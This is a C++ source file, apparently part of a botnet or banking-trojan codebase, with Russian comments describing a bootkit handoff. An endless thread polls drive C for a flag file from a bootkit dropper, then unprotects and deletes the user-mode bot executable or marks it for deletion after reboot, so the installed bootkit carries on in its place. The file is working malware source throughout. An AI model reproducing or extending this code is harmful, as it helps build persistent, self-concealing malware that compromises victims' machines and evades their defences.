
#include <windows.h>

#include "bootkit.h"
#include "BotCore.h"

#include "BotUtils.h"

//#include "BotDebug.h"

namespace bootkit_Template
{
    #include "DbgTemplates.h"
}
#define BD_MSG  bootkit_Template::DBGOutMessage<>

BOOL isFileExist11(CHAR* filename)
{
	DWORD attr = (DWORD)pGetFileAttributesA(filename);
	if(attr == INVALID_FILE_ATTRIBUTES) return FALSE;
	return TRUE;
}

DWORD WINAPI IsBootkitInstaledThread( LPVOID lpData )
{
	// Сделан вечный цикл ожидания файла установки буткита.
	// Если он находится, делается попытка удалить свой файл.
	// Если получается - то просто удаляет файл признака, что означает 
	// успех и продолжает свою работу. Всё равно после этого произойдёт ребут.
	// Если не получается - то помечает файл бота на удаление после ребута.
	// В это время дропер буткита ждет некоторое время успешного удаления и 
	// после некоторого ожидания - всё равно делает ребут.
	while(true)
	{
		PCHAR Path= STR::Alloc(MAX_PATH);
		pGetSystemDirectoryA(Path,MAX_PATH);
		PCHAR UID=STR::Alloc(120);
		GenerateUid(UID);
		//PCHAR dat=STR::GetLeftStr(Path,"\\",true);
		Path[3]='\0';
		//pSleep(1000*60);
		
		PCHAR Pref= STR::GetRightStr(UID,"0");
		m_lstrcat(Path,Pref);
		BD_MSG("bootkit","ищем файл флага от буткит дропера на диске С: %s",Path);
		
		if(isFileExist11(Path))
		{
			BD_MSG("bootkit","файл флага от буткит дропера найден  %s",Path);

			BOT::Unprotect();
			string BOT = BOT::GetBotFullExeName();
			BD_MSG("bootkit","ищем файл бота ринг3  %s",BOT);
			if(isFileExist11(BOT.t_str()))
			{
				BD_MSG("bootkit","файл бота ринг3 найден  %s",BOT);
				pSetFileAttributesA( BOT.t_str(), FILE_ATTRIBUTE_ARCHIVE );
				if (!(BOOL)pDeleteFileA(BOT))
				{
					BD_MSG("bootkit","no delfile %d",(DWORD)pGetLastError());
					pMoveFileExA(BOT.t_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
				}
				else
				{
					BD_MSG("bootkit","Файл удален ");
					pSetFileAttributesA( Path, FILE_ATTRIBUTE_NORMAL );
					pDeleteFileA(Path);
				}
			}
		}
		STR::Free(Pref);
		STR::Free(Path);
		STR::Free(UID);
		pSleep(1000*30);
	}
	return 0;
}

void IsBootkitInstaled()
{
	StartThread(IsBootkitInstaledThread,NULL);
}